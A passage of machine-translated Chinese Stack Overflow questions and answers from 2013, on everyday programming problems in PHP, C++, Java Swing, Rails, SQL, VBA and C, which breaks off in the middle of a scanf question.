您无法通过名称访问应用程序栏按钮。

像这样的东西应该工作

```
 // Get the current application bar
  ApplicationBar thebar = this.ApplicationBar as ApplicationBar;

  // You need to know the index of the button in the collection and grab it
  ApplicationBarIconButton thebutton = thebar.Buttons[0] as ApplicationBarIconButton;

   //change the icon image
  thebutton.IconUri = new Uri("/Images/YourImage2.png", UriKind.Relative); 
```

# php - 我的 PHP 获取 YouTube 视频 api 函数没有打印任何内容

> ID：15825214
> 
> 赞同：0
> 
> 时间：2013-04-05T03:04:37.577
> 
> 标签：php, api, youtube

刚刚创建了一个 API（作为练习）来获取我最新的 YouTube 视频，但没有打印任何内容。我对 PHP 很陌生，刚刚开始为自己创建一个网站

youtube_api.inc.php

```
 <?php

function get_latestvideo($username)
{
    if (true || (time() - filetime("{$GLOBALS['path']}/cache/video_cache.txt")) > 3600)
    {
        $videos = array();

        $data = "http://gdata.youtube.com/feeds/api/users/{$username}/uploads?start-index=1&max-results=1&v=2&alt=json";
        foreach (json_decode(file_get_contents("$data"))->feed->entry as $video)
        {
            $url = (array)$video->link[0];

            $videos[] = array(
                'title' => $video->title->{'$t'},
                'desc' => $video->{'media$group'}->{'media$description'}->{'$t'},
                'url' => $url['href'],
            );
        }

        file_put_contents("{$GLOBALS['path']}/cache/video_cache.txt", serialize($videos));
    }else{
        $videos = unserialize(file_get_contents("{$GLOBALS['path']}/cache/video_cache.txt"));
    }
}

function get_playlists($username)
{

}

?> 
```

初始化文件

```
 <?php

$path = dirname(__FILE__);

include("youtube_api.inc.php");

?> 
```

视频.php

```
<?php

header('Content-Type: text/plain');

include('init.inc.php');

print_r(get_latestvideo('thegigglesquid'));

?> 
```

最后一个文件应该打印`$videos`数组。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:08:58.870

你永远不会从你的函数中返回任何东西。

尝试添加：

```
return $videos; 
```

在函数结束时，在`if() {} else {}`语句之外。

```
function get_latestvideo($username) {    
    $videos = array();
    if (true || (time() - filetime("{$GLOBALS['path']}/cache/video_cache.txt")) > 3600) {
        // ...
    } else {
        // ...
    }
    return $videos; // <-- Important!
} 
```

# database - 从数据库中选择一个随机条目

> ID：15825217
> 
> 赞同：0
> 
> 时间：2013-04-05T03:04:40.123
> 
> 标签：database, random

我正在尝试编写一个应用程序来帮助我进行测验之夜。

我有不同类别的不同数据库，我希望能够从中随机挑选一个问题，并将其显示在屏幕上。

到目前为止，我得到了：

```
 If LCat.Text = "Film" Then
        LQues.Text = Film_QuestionTextBox.Text
        Film_UsedTextBox.Text = "Y"
        FilmBindingSource.EndEdit()
        FilmTableAdapter.Update(Me.Database1DataSet)
    End If 
```

这会从相应的数据库中选择第一个问题，但是如何使它成为一个随机问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:06:46.210

至少在 T-SQL 中，您可以使用此 SQL 从`Questions`表中获取单个随机行：

```
SELECT TOP 1 * FROM [Questions] ORDER BY NEWID() 
```

该函数为每一行`NEWID()`生成一个随机数。`UNIQUEIDENTIFIER`

# ios - 如何禁用 UITextField 以删除自定义数字

> ID：15825221
> 
> 赞同：0
> 
> 时间：2013-04-05T03:04:54.463
> 
> 标签：ios, login

我有应用程序，它有一个登录表单！用户正在使用电话号码登录。手机号码总是以国家代码开头，可以用 +7 或 8 输入。我需要一个严格的字段，除了 +7 符号。那么如何自定义 UITextField 以便用户只能更改该字段的其余部分？我的意思是，我需要文本字段的文本属性始终用 +7 数字填充，这样用户将无法删除它，而只需添加他的数字。我希望，这是可以理解的）））提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:10:45.430

`textField:shouldChangeCharactersInRange:replacementString:`是您需要使用的。

[UITextField Delegate 的类参考](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextFieldDelegate_Protocol/UITextFieldDelegate/UITextFieldDelegate.html)：

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T03:12:17.250

您应该实现前两个字符（前缀）的`textField:shouldChangeCharactersInRange:replacementString:`方法[`UITextFieldDelegate`](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextFieldDelegate_Protocol/UITextFieldDelegate/UITextFieldDelegate.html)并返回。`NO``"+7"`

就像是

```
- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string {
    return !NSEqualRanges(range, (NSRange){0,2});
} 
```

这将完全防止文本字段中的前两个字符被修改。

# c++ - 货币面额

> ID：15825222
> 
> 赞同：0
> 
> 时间：2013-04-05T03:04:55.193
> 
> 标签：c++, string, parsing

尝试为我的游戏使用适当的货币面额。货币以字符串形式存储（即，由于我的教授，无法更改），并且按铂金、黄金、白银和铜的顺序排列。例如，如果我将我的货币初始化为“0.1.23.15”，这意味着我有 0 白金、1 黄金、23 银和 15 铜。

然而，我需要能够转换到更高的面额。这意味着什么？例如，如果我有 105 个银币（即 0.0.105.0），它应该显示为 1 金和 5 银（即 0.1.5.0）。

我在 setCost 方法中加粗了我的问题。我正在检查一个数字是否大于 100，如果是 - 我将该列设为 0，返回到前一个元素并在 ASCII 值上加一，给出正确的进位。不幸的是，调试器显示“/x4”被转储到元素中，而不仅仅是“4”。有谁知道这是为什么以及我该如何改变它？

**编辑：编辑了代码，只要您不输入超过 100 的数字，它就可以工作。对于如何使其适用于大于 100 的数字，大脑出现了失误。**

这是我写过的最草率的代码。请温柔一点。:(

```
void Potion::setCost(std::string cost)
{
    char buffer[256];
    std::string currencyBuffer [4];
    int integerBuffer[4];
    int * integerPointer = nullptr;
    int temp = 0;
    int i = 0;
    char * tokenPtr;
    //Convert string to cString
    strcpy(buffer, cost.c_str() );

    //Tokenize cString
    tokenPtr = strtok(buffer, ".");

    while(tokenPtr != nullptr)
    {
        //Convert ASCII to integer
        temp = atoi(tokenPtr);

        //Store temp into currency buffer
        integerBuffer[i] = temp;

        //Make pointer point to integer buffer
        integerPointer = &integerBuffer[i];

        if(*integerPointer < 100)
            currencyBuffer[i] = tokenPtr;
        else
        {
            //Store zero in column if number is 
            //greater than 100
            temp2 = temp % 100;
            itoa(temp2, temp3, 10);
            currencyBuffer[i] = temp3;

            //Go back and add one to currency buffer
            temp = atoi(currencyBuffer[i-1].c_str());
            temp += 1;
            itoa(temp, temp3, 10);
            currencyBuffer[i - 1] = temp3;
        }

        i++;

        //Get next token
        tokenPtr = strtok(nullptr, ".");
    }
    NewLine();

    std::string tempBuffer;

    //Store entire worth of potions
    tempBuffer = "Platinum: ";
    tempBuffer += currencyBuffer[0];
    tempBuffer += "\nGold: ";
    tempBuffer += currencyBuffer[1];
    tempBuffer += "\nSilver: ";
    tempBuffer += currencyBuffer[2];
    tempBuffer += "\nCopper: ";
    tempBuffer += currencyBuffer[3];

    mCost = tempBuffer;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:28:03.213

我认为问题出在这一行：

```
currencyBuffer[i - 1] = temp; 
```

您将 int ( `temp`) 分配给字符串 ( `currencyBuffer[i-1]`)，这会导致写入垃圾字符。显然，这是允许的：（[为什么 C++ 允许将整数分配给字符串？](https://stackoverflow.com/questions/1177704/why-does-c-allow-an-integer-to-be-assigned-to-a-string)）因为整数可以隐式转换为字符，而字符可以分配给字符串。

您想使用`itoa`或类似的函数将 temp 转换为 char（当您从字符串中获取 int 时，您已经正确地执行了相反的操作，atoi）。

由于您使用的是 C++，因此一个简单的方法是：

```
std::stringstream itos;
itos << temp;
currencyBuffer[i-1] = itos.c_str(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:38:08.577

不确定这是否只有我在这里（我的 C++ 时代可以追溯到大约 13 年），你的老师最适合回答你这个问题，但感觉就像你在做什么/你在做什么是非常处理器密集的。从技术上讲，您最好将整个字符串拆分为一个字符串数组，然后使用它们来确定您的最终计数：

```
std::string str = "I.have.a.dog";
//replace all DOTS with SPACES for next use
for (int i = 0; i < str.length(); ++i) {
    if (str[i] == '.')
      str[i] = ' ';
}
std::istringstream stm(str) ;
string word ;
while( stm >> word ) // read white-space delimited tokens one by one 
{
   // put word into array
} 
```

从那里，你有一个数组，带有正确的文本/单词，进入一个数组，你可以用它来做你的计算......不过只是一个想法......不要引用我的话;）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T03:50:31.000

这是我为解析您的号码而创建的函数。大于...的数字没有问题，如果您愿意，请使用它=）

```
unsigned long int str2cur(std::string cost)
{
    unsigned long int money = 0;
    //given that there are always 4 segments
    int end;
    do
    {
        end = cost.find('.', 0);
        money = money * 100 + atoi(cost.substr(0, end).c_str());
        cost.erase(0, end + 1);         
    }
    while (end != std::string::npos);
    return money;
} 
```

# javafx-2 - 恢复 TextFieldTableCell 值

> ID：15825224
> 
> 赞同：1
> 
> 时间：2013-04-05T03:05:24.413
> 
> 标签：javafx-2

我在此页面中使用了启用单元格编辑的示例 13-10 TableViewSample：

[http://docs.oracle.com/javafx/2/ui_controls/table-view.htm](http://docs.oracle.com/javafx/2/ui_controls/table-view.htm)

让我们看看这部分：

```
firstNameCol.setOnEditCommit(
            new EventHandler<CellEditEvent<Person, String>>() {
                @Override
                public void handle(CellEditEvent<Person, String> t) {
                    ((Person) t.getTableView().getItems().get(
                            t.getTablePosition().getRow())
                            ).setFirstName(t.getNewValue());
                }
            }
        ); 
```

在句柄方法中，我想做一些捕获异常的事情，当异常发生时，单元格文本必须恢复到它的旧值。但我不能改变文字，当我打电话

```
((Person) t.getTableView().getItems().get(
                            t.getTablePosition().getRow())
                            ).setFirstName(t.getOldValue()); 
```

只是改变tableView数据的值，不显示文本

# c#-4.0 - ASP.NET MVC 4 AttributeRouting 同一控制器中的多个 POST 操作

> ID：15825225
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:05:47.070
> 
> 标签：c#-4.0, asp.net-mvc-4, asp.net-web-api

我不确定我在这里做错了什么。每当我向控制器发布请求时，总是会调用更新操作。我打电话给：

```
http://localhost/members/login/ 
```

但是更新不断收到请求。我什至尝试在控制器中切换操作的顺序无济于事。

```
[RoutePrefix("Members")]
public class MembersController : ApiController
{
    [POST("{member}")]
    public void Update(Member member)
    {
        //Do Some Stuff
    }

    [POST("Login/{member}")]
    public HttpResponseMessage MemberLogin(Member member)
    {
       //Do Some Stuff
    }
} 
```

任何帮助深表感谢。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:22:49.673

那是因为对于 Api 路由，它们是相同的。[这篇文章](http://www.asp.net/web-api/overview/web-api-routing-and-actions/routing-and-action-selection)详细解释了如何在 Web API 中完成路由和动作选择。如果您不想将它们拆分为两个控制器，请`Update`作为`PUT`请求发出。这应该告诉路由引擎它们是两个不同的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:03:59.070

我想通了，通过反复试验（很多小时：/）

```
[RoutePrefix("Members")]
public class MembersController : ApiController
{
    [POST("Update")]
    public void Update(Member member)
    {
        //Do Some Stuff
    }

    [POST("Login")]
    public HttpResponseMessage MemberLogin(Member member)
    {
       //Do Some Stuff
    }
} 
```

不知道为什么会这样，但我相信它最终会来找我。

# java - 多线程锁定 Java Swing GUI

> ID：15825230
> 
> 赞同：2
> 
> 时间：2013-04-05T03:06:28.400
> 
> 标签：java, multithreading, swing, swingutilities

我正在为一个多用户绘图程序开发一个项目，但我遇到了我的 GUI 锁定问题。

除了这个错误之外，我已经完成了大部分程序，它是一个相当大的程序，所以我试图在一个较小的程序中重现该错误。

在这个较小的程序中，我有 2 个 JFrame。两者都可以通过单击和拖动鼠标来绘制。辅助 JFrame 是一个休眠 10 秒的线程，然后将您绘制的内容发送到另一个要显示的帧。

但是，一旦主框架接收到来自辅助框架的图像，GUI 就会锁定，并且无法再绘制主框架。

我目前正在使用 SwingUtilities.invokeLater() 方法。在寻找答案时，我找到了 SwingWorker 类，但我想看看是否有一个简单的解决方案，然后再对我的代码进行大量重写以尝试使其与 SwingWorker 一起使用。

谢谢阅读。我的代码如下。另外，这是我第一次在这里发帖。我似乎在格式化代码时遇到了一些问题，所以如果出现错误，我提前道歉。我会尽力修复它。

```
package gui_thread_test;

import java.awt.Color;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.RenderingHints;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionAdapter;
import javax.swing.JComponent;

public class DrawPanel extends JComponent
{
    private Image canvas;
    private int x, y, prevX, prevY;
    Graphics2D g2;

    public DrawPanel()
    {
        setDoubleBuffered(false);
        addMouseListener(new MouseAdapter()
        {
            @Override
            public void mousePressed(MouseEvent e )
            {
                prevX = e.getX();
                prevY = e.getY();
            }
        });

        addMouseMotionListener(new MouseMotionAdapter()
        {
            @Override
            public void mouseDragged(MouseEvent e)
            {
                x = e.getX();
                y = e.getY();
                g2.drawLine(prevX, prevY, x, y);
                repaint();
                prevX = x;
                prevY = y;
            }
        });
    }

    @Override
    public void paintComponent(Graphics g)
    {
        if (canvas == null)
        {
            canvas = createImage(getSize().width, getSize().height);
            g2 = (Graphics2D) canvas.getGraphics();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

        }
        g.drawImage(canvas, 0, 0, null);
    }

    public synchronized void updateCanvas(Image _canvas)
    {
        canvas = _canvas;
        repaint();
    }

    public Image getImage()
    {
        return canvas;
    }
} 
```

-

```
package gui_thread_test;

import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.RenderingHints;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;

public class ThreadTest extends JFrame implements Runnable
{
    private Image canvas;
    private Graphics2D g2;
    private DrawPanel panel;
    private DrawPanel threadPanel;

    public ThreadTest(DrawPanel _panel)
    {
        super("Secondary");
        panel = _panel;

        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setPreferredSize(new Dimension(500,500));
        this.setMinimumSize(new Dimension(500,500));
        this.setVisible(true);

        threadPanel = new DrawPanel();
        this.add(threadPanel);
    }

    public void paintComponent(Graphics g)
    {
        if (canvas == null)
        {
            canvas = createImage(getSize().width, getSize().height);
            g2 = (Graphics2D) canvas.getGraphics();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
        }
        g.drawImage(canvas, 0, 0, null);        
    }

    @Override
    public void run() {
        //Sleep thread for 10 seconds to give time to draw on the image
        try {
            Thread.sleep(10000);
        } catch (InterruptedException ex) {
            Logger.getLogger(ThreadTest.class.getName()).log(Level.SEVERE, null, ex);
        }

        SwingUtilities.invokeLater(
                new Runnable() {
                    @Override
                    public void run() {
                        //Posts the message to the server chat window
                        panel.updateCanvas(threadPanel.getImage());
                    }
                });
    }

} 
```

-

```
package gui_thread_test;

import java.awt.Dimension;
import javax.swing.JFrame;

public class GUI_Thread_Test {

    public static void main(String[] args) 
    {
        JFrame window = new JFrame("Main");
        window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        window.setPreferredSize(new Dimension(500,500));
        window.setMinimumSize(new Dimension(500,500));

        DrawPanel draw = new DrawPanel();
        window.add(draw);

        Thread testThread = new Thread(new ThreadTest(draw));
        testThread.start();

        window.pack();
        window.setVisible(true);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T03:12:57.230

每 10 秒的传输使用 Swing Timer 而不是线程。使用 BufferedImages 保存图纸并传输图纸。

例如：

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Point;
import java.awt.Dialog.ModalityType;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

import javax.swing.*;

public class GuiDoubleDraw extends JPanel {
   private static final int BI_WIDTH = 500;
   private static final int BI_HEIGHT = BI_WIDTH;
   public static final Color PEN_COLOR = Color.black;
   private BufferedImage backgroundImg = new BufferedImage(BI_WIDTH, BI_HEIGHT,
         BufferedImage.TYPE_INT_ARGB);

   public GuiDoubleDraw() {
      MyMouseAdapter mouseAdapter = new MyMouseAdapter();
      addMouseListener(mouseAdapter);
      addMouseMotionListener(mouseAdapter);
   }

   @Override
   protected void paintComponent(Graphics g) {
      super.paintComponent(g);
      if (backgroundImg != null) {
         g.drawImage(backgroundImg, 0, 0, this);
      }
   }

   @Override
   public Dimension getPreferredSize() {
      return new Dimension(BI_WIDTH, BI_HEIGHT);
   }

   public BufferedImage getBackgroundImage() {
      BufferedImage copyImg = new BufferedImage(BI_WIDTH, BI_HEIGHT,
            BufferedImage.TYPE_INT_ARGB);
      Graphics g = copyImg.getGraphics();
      g.drawImage(backgroundImg, 0, 0, null);
      g.dispose();
      return copyImg;
   }

   public void setBackgroundImage(BufferedImage bImg) {
      this.backgroundImg = bImg;
      repaint();
   }

   private class MyMouseAdapter extends MouseAdapter {
      Point previousPt = null;

      @Override
      public void mousePressed(MouseEvent mEvt) {
         previousPt = mEvt.getPoint();
      }

      @Override
      public void mouseDragged(MouseEvent mEvt) {
         drawPt(mEvt);
      }

      @Override
      public void mouseReleased(MouseEvent mEvt) {
         drawPt(mEvt);
      }

      private void drawPt(MouseEvent mEvt) {
         Graphics g = backgroundImg.getGraphics();
         Point nextPt = mEvt.getPoint();
         g.setColor(PEN_COLOR);
         g.drawLine(previousPt.x, previousPt.y, nextPt.x, nextPt.y);
         g.dispose();
         previousPt = nextPt;
         repaint();
      }

   }

   private static void createAndShowGui() {
      final GuiDoubleDraw guiDoubleDraw1 = new GuiDoubleDraw();
      final GuiDoubleDraw guiDoubleDraw2 = new GuiDoubleDraw();

      JFrame frame = new JFrame("Draw 1");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(guiDoubleDraw1);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);

      JDialog dialog = new JDialog(frame, "Draw 2", ModalityType.MODELESS);
      dialog.getContentPane().add(guiDoubleDraw2);
      dialog.pack();
      dialog.setLocationRelativeTo(null);
      dialog.setVisible(true);

      int timerDelay = 10 * 1000;
      new Timer(timerDelay, new ActionListener() {

         @Override
         public void actionPerformed(ActionEvent arg0) {
            guiDoubleDraw1.setBackgroundImage(guiDoubleDraw2
                  .getBackgroundImage());
         }
      }).start();
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T03:22:56.370

您的应用程序没有锁定，您`Thread`正在退出。

这里没有什么可以阻止`run`方法完成，通过终止`Thread`，这意味着不会有更多的更新。

```
public void run() {
    //Sleep thread for 10 seconds to give time to draw on the image
    try {
        Thread.sleep(10000);
    } catch (InterruptedException ex) {
        Logger.getLogger(ThreadTest.class.getName()).log(Level.SEVERE, null, ex);
    }

    SwingUtilities.invokeLater(
            new Runnable() {
                @Override
                public void run() {
                    System.out.println("Post...");
                    //Posts the message to the server chat window
                    panel.updateCanvas(threadPanel.getImage());
                }
            });
} 
```

HovercraftFullOfEels 是正确的，请[`javax.swing.Timer`](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)改用。它将继续定期滴答作响。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T03:14:53.257

您将希望在您的代码中实现 SwingWorker，这将允许您在事件调度线程上运行代码。即使您应该在这种情况下找到解决方法，SwingWorker 也是使用线程更新 UI 的正确方法。您会发现使用各种线程并尝试在没有 SwingWorker 的情况下更新 UI 通常会“将自己逼入绝境”。我会重构并将其用作积极的学习体验。

# ruby-on-rails - Ruby on Rails：防止通过默认应用程序执行新页面

> ID：15825232
> 
> 赞同：1
> 
> 时间：2013-04-05T03:06:31.490
> 
> 标签：ruby-on-rails

我刚刚开始学习 Ruby on Rails，而且我知道每次在页面中创建新页面时，`app/assets/views`页面都会通过`layouts/application`具有 HTML 标记和`<%= yield %>`

但是，如果我想创建一个具有不同页面产量（或除了默认应用程序页面之外的不同布局）的主页，我该怎么做才能使其不必通过该默认应用程序？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:11:15.883

假设您有一个控制器，您可以设置布局：

```
class HomeController < ApplicationController
  layout 'my_layout'
end 
```

这将使控制器**HomeController**的所有操作呈现布局“app/views/layouts/my_layout.html.erb”，而不是默认布局。

您还可以为操作指定布局，例如：

```
class HomeController < ApplicationController
  def index
    render layout: 'my_layout'
  end
end 
```

或者根本不使用布局：

```
class HomeController < ApplicationController
  def index
    render layout: false
  end
end 
```

您可以在此处找到有关导轨和布局的更多信息[。](http://guides.rubyonrails.org/layouts_and_rendering.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:12:44.530

有几种方法可以实现这一点。

**控制器宽**

在您的控制器中，您可以使用该`layout`方法

```
class MyController < ApplicationController
  layout :name_of_my_layout
end 
```

这将`app/views/layout/name_of_my_layout.html.erb`用作下所有操作的布局`MyController`

您还可以传递一个`layout`返回布局名称的方法

```
class MyController < ApplicationController
  layout :random_layout

  private

  def random_layout
    %[layout1 layout2 layout3].sample
  end
end 
```

该方法确定每个请求`random_layout`下的操作要使用的布局。`MyController`

**每次渲染**

您可以通过将选项传递`layout`给呈现调用来覆盖上述选项。

```
class MyController < ApplicationController
  layout :name_of_my_layout

  def index
    ...
    render layout: false # no layout
  end

  def new
    ...
    render layout: 'my_super_duper_layout_for_the_new_action'
  end
end 
```

**命名约定**

您可以使用控制器的名称作为布局的名称。例如，您有一个 posts 控制器，如果您有一个`app/views/layouts/posts.html.erb`, rails 将使用它而不是`app/views/layouts/application.html.erb`如果您没有在控制器中指定布局。

# python - 嵌套的defs不起作用

> ID：15825241
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:07:01.920
> 
> 标签：python

我需要在第二个 def 语句中添加什么才能使其正常工作？

```
def main():
    # the user has to choose a picture and then he is asked to
    pic = makePicture(pickAFile())

    # the user is asked to select a color that he wants to remove from a picture
    color = requestString("Which color would you like to remove?")
    show(pic)

    # whats wrong with this last part that doesn't make the modifications to the picture
    def RemoveColor(pic, color):
        r = red
        g = green
        b = blue
        for px in getPixels(pic):
            setRed(px, 0)

        for px in getPixels(pic):
            setGreen(px, 0)

        for px in getPixels(pic):
            setBlue(px, 0)

    repaint(pic) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T14:32:11.020

`RemoveColor`在这里我从你的函数中取出函数`main`，然后从内部调用它`main`

```
def RemoveColor(pic, color):
    r = red
    g = green
    b = blue
    for px in getPixels(pic):
        setRed(px, 0)

    for px in getPixels(pic):
        setGreen(px, 0)

    for px in getPixels(pic):
        setBlue(px, 0)

def main():
    # the user has to choose a picture and then he is asked to
    pic = makePicture(pickAFile())

    # the user is asked to select a color that he wants to remove from a picture
    color = requestString("Which color would you like to remove?")
    show(pic)

    RemoveColor(pic, color) # HERE I'M CALLING RemoveColor
    repaint(pic) 
```

# sql - 日期前的 MS Access 信息

> ID：15825247
> 
> 赞同：0
> 
> 时间：2013-04-05T03:07:43.263
> 
> 标签：sql, ms-access

我试图找到 1991 年之前被雇用的员工。当我运行查询时，我得到“标准表达式中的数据类型不匹配”这是什么意思？

这是我的查询：

```
SELECT EMP_NUM, EMP_LNAME, EMP_FNAME, EMP_INITIAL, JOB_CODE, EMP_PCT, PROJ_NUM
FROM employee
where emp_hiredate < '01/01/1991'; 
```

我也试过 01-01-1991 和 1991 年 1 月 1 日和 1991 年 1 月 1 日星期二。

表中录用日期的格式为星期几、月、日#、年，即）1994 年 11 月 8 日星期二。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:10:03.060

[在 Microsoft Access 中处理日期的 10 个技巧](http://www.techrepublic.com/article/10-tips-for-working-with-dates-in-microsoft-access/6135056)

> # 6 包含文字日期值时使用的正确字符是井号 (#)。

您的查询应该是

```
SELECT EMP_NUM, EMP_LNAME, EMP_FNAME, EMP_INITIAL, JOB_CODE, EMP_PCT, PROJ_NUM
FROM employee
where emp_hiredate < #01/01/1991# 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:09:31.093

在 MS Access 中，yu 应该`#`不使用单引号将日期括起来。

```
WHERE emp_hiredate < #01/01/1991# 
```

*   [浏览日期/时间字段的标准](http://office.microsoft.com/en-001/access-help/examples-of-query-criteria-HA010066611.aspx)

# graphics - 线段或边缘交叉点查找算法的时间复杂度

> ID：15825248
> 
> 赞同：3
> 
> 时间：2013-04-05T03:07:44.410
> 
> 标签：graphics, gis, computational-geometry, time-complexity, asymptotic-complexity

我简要回顾了计算几何中关于线交叉和线排列问题的文献。其中大部分基于平面扫描算法。从计算复杂度的角度来看，在我看来，渐近算法边界是线段数和术语“k”的函数，其中“k”是边之间的交叉点数。例如，最著名的算法之一具有 O(nlogn + "k") 的时间复杂度，这是输出敏感的。我的问题是难以理解为什么我们不能在提供时间复杂度的同时摆脱术语“k”。因为如果我们看一下其他算法，例如排序问题，复杂性不是完成多少交换或比较的函数。它只是输入数量的函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T23:49:10.813

如果您想严格按照输入中的线段数来表达最坏情况的复杂性，那么您必须假设 K 可能有最大的交叉点数（即 N ²）。因此，如果您愿意，也可以将具有 O(N log N + K) 时间复杂度的算法（例如 Balaban's）称为 O(N ² + N log N) 或 O(N * (N + log N))。

# vba - VBA中的后遍历递归以计算合并状态

> ID：15825249
> 
> 赞同：1
> 
> 时间：2013-04-05T03:07:48.827
> 
> 标签：vba, post, recursion, traversal, consolidation

![在此处输入图像描述](https://i.stack.imgur.com/XFqSN.jpg)

我很抱歉，因为我是 VBA 的新手。我正在寻找一个后遍历示例来解决以下问题。我想递归遍历 A 列中的树来计算合并状态。如我下面的示例表“Real Proj 1”具有状态 A (=Amber)。“Real Proj 2 和 3 的状态均为 G（绿色）。由于 Program B 的子项目之一包含 Amber，因此计算状态应为 Amber（见 C 列）。或者第 2 行的“简化”合并状态为Amber 及其所有子项（“Real Proj A”，程序 B 和 C）包含至少一种 Amber 状态。

A 列中的值包含缩进，即第 3 行的“程序 A”的缩进级别 = 1，第 6 行的“Real Proj 2”的缩进级别 = 3。有关如何在 VBA 中使用递归实现此功能的任何帮助都会非常有用赞赏。谢谢，克里斯

这是我的解决方案。希望这对其他人也有帮助。最好的，克里斯

```
Sub TestStatus()
    Call PopulateStatus(2)
End Sub

Sub PopulateStatus(rowIndex As Integer)
    Dim level As Integer
    Dim children() As Integer
    Dim child As Integer
    Dim existingStatus As String
    Dim calculatedStatus As String
    Dim counter As Integer
    Dim aggregatedRow As Integer

    If (hasChildren(rowIndex)) Then
        aggregatedRow = rowIndex
        children = getChildren(rowIndex)

        ' Do something with the children
        For counter = LBound(children) To UBound(children)
            child = children(counter)
            Call PopulateStatus(child)
        Next counter

        'Write aggregated status of all children to column B
        calculatedStatus = getStatus(children)
        Cells(aggregatedRow, 2).Value = calculatedStatus
    Else
        existingStatus = Cells(rowIndex, 2).Value
        ' Check if we are last in children
        If (Cells(rowIndex, 1).IndentLevel > Cells(rowIndex + 1, 1).IndentLevel) Then
            'Cells(aggregatedRow, 2).Value = calculatedStatus
        End If

    End If

End Sub

Function getStatus(ByRef myArray() As Integer) As String
    Dim resultStatus As String
    Dim currentStatus As String
    Dim counter As Integer
    resultStatus = "G"

    For counter = 0 To UBound(myArray)
        currentStatus = Cells(myArray(counter), 2).Value

        If currentStatus = "R" Or resultStatus = "R" Then
            calculateStatus = "R"
            Exit Function
        End If

        If currentStatus = "A" Then
            resultStatus = "A"
        End If

        If currentStatus = "G" And resultStatus = "A" Then
            resultStatus = "A"
        End If
    Next
    getStatus = resultStatus

End Function

Function getChildren(rowIndex As Integer) As Variant
    Dim children() As Integer
    Dim myIndLevel As Integer
    Dim newIndLevel As Integer
    Dim counter As Integer
    Dim count As Integer
    myIndLevel = Cells(rowIndex, 1).IndentLevel
    count = 0
    For counter = rowIndex + 1 To 14
        newIndLevel = Cells(counter, 1).IndentLevel
        If (newIndLevel = myIndLevel + 1 And newIndLevel <> myIndLevel) Then
            ReDim Preserve children(count) As Integer
            children(count) = counter
            rowIndex = rowIndex + 1
            count = count + 1
        End If
    Next
    getChildren = children
End Function

Function hasChildren(myRow As Integer)
    Dim indLevel As Integer
    Dim newLevel As Integer
    indLevel = Cells(myRow, 1).IndentLevel
    newLevel = Cells(myRow + 1, 1).IndentLevel

    If newLevel > indLevel Then
        hasChildren = True
        Exit Function
    End If
    hasChildren = False
End Function 
```

# c - 为什么 scanf("%hhu", char*) 在本地时会覆盖其他变量？

> ID：15825254
> 
> 赞同：6
> 
> 时间：2013-04-05T03:08:33.140
> 
> 标签：c, gcc, gcc4.7

标题说明了一切。我正在使用 GCC 4.7.1（与 CodeBlocks 捆绑）并且遇到了一个奇怪的问题。考虑一下：

```
int main() {
    unsigned char a = 0, b = 0, c = 0;
    scanf("%hhu", &a);
    printf("a = %hhu, b = %hhu, c = %hhu\n", a, b, c);
    scanf("%hhu", &b);
    printf("a = %hhu, b = %hhu, c = %hhu\n", a, b, c);
    scanf("%hhu", &c);
    printf("a = %hhu, b = %hhu, c = %hhu\n", a, b, c);
    return 0;
} 
```

对于输入 1、2 和 3，此输出

```
a = 1, b = 0, c = 0
a = 0, b = 2, c = 0
a = 0, b = 0, c = 3 
```

但是，如果我将 a、b 和 c 声明为全局变量，它会按预期工作。为什么会这样？

先感谢您

其他详情：

我正在运行 Windows 8 64 位。我也尝试了 -std=c99 并且问题仍然存在。

**进一步的研究**

测试此代码

```
void printArray(unsigned char *a, int n) {
